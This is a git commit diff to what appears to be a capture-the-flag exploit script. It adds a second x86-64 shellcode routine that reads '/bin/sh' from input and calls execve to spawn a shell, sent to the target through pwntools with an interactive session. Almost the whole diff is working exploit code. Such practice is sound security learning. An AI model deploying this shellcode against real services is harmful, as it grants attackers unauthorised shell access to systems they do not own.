d6c4f76a91f2e7a9413fff9dfef35a79c0e74f04
filippofini <filippo.fini@mail.polimi.it>
2025-01-02 10:54:33 +0100

    Added second method to tiny

--- Shellcode/Tiny/x.py
+++ Shellcode/Tiny/x.py
@@ -30,7 +30,33 @@ xor esi, esi
 syscall
 .string "/bin/sh"
 """
+
+# Second way with open input and send /bin/sh
+asm_code2 = """
+push 0
+pop rax
+push 0
+pop rdi
+push rdx
+pop rsi
+push 8
+pop rdx
+syscall
+nop
+push rsi
+pop rdi
+push 0
+pop rsi
+push 0
+pop rdx
+push 0x3b
+pop rax
+syscall
+"""
+
 r.recvuntil("> ")
 r.sendline(asm(asm_code))
+
+#r.send(b"/bin/sh\0") # Use with sellcode 2
 
 r.interactive()
